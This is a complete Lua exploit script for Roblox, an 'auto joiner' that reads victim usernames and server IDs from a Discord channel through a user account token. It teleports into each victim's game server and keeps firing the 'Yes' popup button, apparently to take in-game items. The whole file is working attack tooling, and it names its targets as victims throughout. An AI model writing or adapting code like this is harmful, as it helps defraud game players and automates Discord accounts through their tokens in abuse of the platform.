token = Token
channelId = ChannelId

if not game:IsLoaded() then
	game.Loaded:Wait() -- Wait for game to load
end

if token == "" or channelId == "" then
    game.Players.LocalPlayer:kick("Add your token or channelId to use")
end

local bb = game:GetService("VirtualUser") -- Anti AFK
game:service "Players".LocalPlayer.Idled:connect(function()
    bb:CaptureController()
    bb:ClickButton2(Vector2.new())
end)

local HttpServ = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local victimFile = isfile("user_gag.txt")
local joinedFile = isfile("joined_ids.txt")
if not victimFile then
    writefile("user_gag.txt", "victim username")
end
if not joinedFile then
    writefile("joined_ids.txt", "[]") -- Initialize with empty JSON array
end
local victimUser = readfile("user_gag.txt")
local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
local didVictimLeave = false
local timer = 0

local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId) -- Add the new ID
    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds)) -- Save back to the file
end

pcall(function()
    local function waitForPlayerLeave()
        task.spawn(function()
            while true do
                task.wait(1.5)
                local victim = game.Players:FindFirstChild(victimUser)
                if not victim then
                    didVictimLeave = true
                    break
                end
            end
        end)
    end

    waitForPlayerLeave()
end)

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

print("Auto Joiner Load Successfully")
game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Joined')
local player = game.Players.LocalPlayer

task.spawn(function()
    pcall(function()
        while true do
            if didVictimLeave ~= true then
                local gui = player:WaitForChild("PlayerGui")
                local hud = gui:FindFirstChild("HUD")
                if hud then
                    local popup = hud:FindFirstChild("PopUp")
                    if popup then
                        local content = popup:FindFirstChild("Content")
                        if content then
                            local buttons = content:FindFirstChild("Buttons")
                            if buttons then
                                local yes = buttons:FindFirstChild("Yes")
                                if yes then
                                    local button = yes:FindFirstChild("TextButton")
                                    if button and button.Visible then
                                        if firesignal then
                                            firesignal(button.MouseButton1Click)
                                            firesignal(button.Activated)
                                        else
                                            button:Activate()
                                            if button.MouseButton1Click then
                                                button.MouseButton1Click:Fire()
                                            end
                                            if button.Activated then
                                                button.Activated:Fire()
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            task.wait(0.1)
        end
    end)
end)

local function increaseTimer()
    while task.wait(1) do
        timer = timer + 1
    end
end

task.spawn(increaseTimer)

local function autoJoin()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            ["Content-Type"] = "application/json"
        }
    })

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages == 0 then
            print("0 messages found")
            return
        end
        for _, message in ipairs(messages) do
            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                if message.embeds[1].title:find("Plants") then
                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
                    if placeId and jobId then
                        local text = message.embeds[1].fields[1].value:gsub("`", "")
                         local victimUsername = text:match("Name:%s*(.-)%s*\n")

                        if didVictimLeave or timer > 25 then
                            if not table.find(joinedIds, tostring(message.id)) then
                                saveJoinedId(tostring(message.id)) -- Save this ID to the list
                                writefile("user_gag.txt", victimUsername)
                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
                                return
                            end
                        end
                    end
                end
            end
        end
    else
        print("Response code is not 200. Is your token and channelid correct?")
    end
end

while wait(5) do
    autoJoin()
end
